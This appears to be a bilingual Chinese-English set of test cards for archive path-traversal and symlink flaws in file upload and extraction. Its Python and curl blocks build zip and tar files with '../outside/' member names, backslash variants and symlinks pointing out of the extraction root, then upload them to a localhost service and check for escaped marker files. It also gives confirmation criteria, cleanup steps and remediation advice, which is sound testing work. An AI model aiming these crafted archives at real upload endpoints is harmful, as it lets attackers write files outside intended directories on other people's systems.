analysis.zh: 确认标准是字节级请求、运行时解析日志和唯一 marker 输出三者一致，普通输入与缺失 marker 对照均失败。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。
analysis.en: Confirmation requires that the byte-level request, runtime parser log, and unique marker output agree while plain-input and missing-marker controls fail. HTTP 200 or 500, reflected filenames, WAF alerts, or a single timeout do not prove the boundary was crossed.

opsecTips.zh: 只使用随机文本 marker、localhost 或 example.invalid，并限制每个变体的请求数和超时。
opsecTips.en: Use only random text markers, localhost, or example.invalid, and cap request count and timeout for each variant.

opsecTips.zh: 结束后删除临时文件、归档、对象和任务记录，并确认没有队列、文件句柄或下游处理残留。
opsecTips.en: Delete temporary files, archives, objects, and test jobs, and verify no queue, file handle, or downstream processing remains.

title.zh: 归档成员路径规范化验证块 1

execution.command:
import zipfile
from pathlib import Path

root = Path("payloader-fixture")
root.mkdir(exist_ok=True)
archive = root / "path-traversal.zip"
with zipfile.ZipFile(archive, "w") as output:
    output.writestr("readme.txt", "PAYLOADER_SAFE_CONTROL")
    output.writestr("../outside/PAYLOADER_MARKER.txt", "PAYLOADER_MARKER")
with zipfile.ZipFile(archive, "r") as input_archive:
    for info in input_archive.infolist():
        print(info.filename, info.file_size)

exploitation.zh: 先提交正常 marker 基线并记录请求 ID，再逐一重放本卡命令。阳性证据必须是原始成员名、解析后名称和最终写入路径与唯一 marker 任务相互关联，正常归档仍留在解压根内；失败状态、响应时延或规则命中只能作为线索。

title.zh: 归档符号链接目标边界验证块 1

execution.command:
import stat
import tarfile
import zipfile
from pathlib import Path

root = Path("payloader-fixture")
root.mkdir(exist_ok=True)
target = "../outside/PAYLOADER_MARKER.txt"
with tarfile.open(root / "symlink.tar.gz", "w:gz") as archive:
    info = tarfile.TarInfo("marker-link")
    info.type = tarfile.SYMTYPE
    info.linkname = target
    archive.addfile(info)
with zipfile.ZipFile(root / "symlink.zip", "w") as archive:
    info = zipfile.ZipInfo("marker-link")
    info.create_system = 3
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    archive.writestr(info, target)
print(target)

execution.command:
import zipfile
from pathlib import Path

root = Path("payloader-fixture")
root.mkdir(exist_ok=True)
archive_path = root / "encoded.zip"
with zipfile.ZipFile(archive_path, "w") as archive:
    archive.writestr(r"..\outside\PAYLOADER_MARKER.txt", "PAYLOADER_MARKER")
with zipfile.ZipFile(archive_path, "r") as archive:
    for info in archive.infolist():
        print(repr(info.filename), info.flag_bits, info.file_size)
raw = archive_path.read_bytes()
print("archive_bytes", len(raw), "contains_marker", b"PAYLOADER_MARKER" in raw)

description.en: Run one Archive Filename-Encoding Differential command block at a time and preserve the raw request, response, and server logs.

description.zh: 原始成员名、解析后名称和最终写入路径与唯一 marker 任务相互关联，正常归档仍留在解压根内，同时用缺失 marker 和正常路径排除缓存、默认文件与其他任务干扰。
description.en: Require that the raw member name, decoded name, and final write path correlate with the unique marker job while the normal archive remains inside the extraction root, and use missing-marker and normal-path controls to exclude cache, default files, and unrelated jobs.

description.zh: 逐项规范化并验证成员目标，拒绝父目录、绝对路径和链接成员，并在独立临时目录使用安全解压 API，随后验证异常变体被拒绝且正常上传、下载或解压仍成功。
description.en: canonicalize and validate every member target, reject parent, absolute, and link members, and use safe extraction APIs in a dedicated temporary directory, then verify the variant is rejected while normal upload, download, or extraction still succeeds.

analysis.zh: 确认标准是原始成员名、解析后名称和最终写入路径与唯一 marker 任务相互关联，正常归档仍留在解压根内。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。
analysis.en: Confirmation requires that the raw member name, decoded name, and final write path correlate with the unique marker job while the normal archive remains inside the extraction root. HTTP 200 or 500, reflected filenames, WAF alerts, or a single timeout do not prove the boundary was crossed.

opsecTips.zh: 只使用随机文本 marker、localhost 或 example.invalid，并限制每个变体的请求数和超时。
opsecTips.en: Use only random text markers, localhost, or example.invalid, and cap request count and timeout for each variant.

opsecTips.zh: 结束后删除临时文件、归档、对象和任务记录，并确认没有队列、文件句柄或下游处理残留。
opsecTips.en: Delete temporary files, archives, objects, and test jobs, and verify no queue, file handle, or downstream processing remains.

name.zh: 文件上传攻击工具：文件工作流 1
name.en: File Upload Testing Tool: File Workflow 1

commands.command:
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
printf "%s" "PAYLOADER_MARKER" > "$WORK/PAYLOADER_MARKER.txt"
(cd "$WORK" && zip -q normal.zip PAYLOADER_MARKER.txt)
unzip -Z1 "$WORK/normal.zip"
curl --fail --silent --show-error --max-time 3 -F "file=@$WORK/normal.zip;type=application/zip" "http://127.0.0.1:8080/upload/batch"
curl --fail --silent --show-error --max-time 3 --head "http://127.0.0.1:8080/uploads/PAYLOADER_MARKER.txt"

name.en: File Upload Testing Tool: File Workflow 2

commands.command:
ARCHIVE="./payloader-fixture/path-traversal.zip"
BASE="http://127.0.0.1:8080"
response=$(curl --fail --silent --show-error --max-time 5 -F "file=@${ARCHIVE};type=application/zip" "$BASE/upload/batch")
printf "%s\n" "$response"
curl --fail --silent --show-error --max-time 3 --head "$BASE/jobs/PAYLOADER_MARKER/status"
curl --fail --silent --show-error --max-time 3 "$BASE/test-output/outside/PAYLOADER_MARKER.txt" | grep --fixed-strings "PAYLOADER_MARKER"
rm -f "$ARCHIVE"

name.zh: Python 安全测试脚本：文件工作流 1
name.en: Python Security Test Scripts: File Workflow 1

commands.command:
import io
import tarfile
from pathlib import Path

root = Path("payloader-fixture")
root.mkdir(exist_ok=True)
content = b"PAYLOADER_MARKER"
with tarfile.open(root / "path-traversal.tar.gz", "w:gz") as archive:
    member = tarfile.TarInfo("../outside/PAYLOADER_MARKER.txt")
    member.size = len(content)
    archive.addfile(member, io.BytesIO(content))
with tarfile.open(root / "symlink.tar.gz", "w:gz") as archive:
    link = tarfile.TarInfo("marker-link")
    link.type = tarfile.SYMTYPE
    link.linkname = "../outside/PAYLOADER_MARKER.txt"
    archive.addfile(link)
for path in root.glob("*.tar.gz"):
    with tarfile.open(path, "r:gz") as archive:
        print(path.name, [(m.name, m.linkname) for m in archive.getmembers()])

name.zh: 文件分析工具箱：文件工作流 1

commands.command:
import io
import tarfile
import zipfile
from pathlib import Path

root = Path("payloader-fixture")
root.mkdir(exist_ok=True)
content = b"PAYLOADER_MARKER"
with tarfile.open(root / "alternate.tar.gz", "w:gz") as archive:
    member = tarfile.TarInfo("../outside/PAYLOADER_MARKER.txt")
    member.size = len(content)
    archive.addfile(member, io.BytesIO(content))
with zipfile.ZipFile(root / "alternate.zip", "w") as archive:
    archive.writestr("../outside/PAYLOADER_MARKER.txt", content)
print([path.name for path in root.glob("alternate.*")])
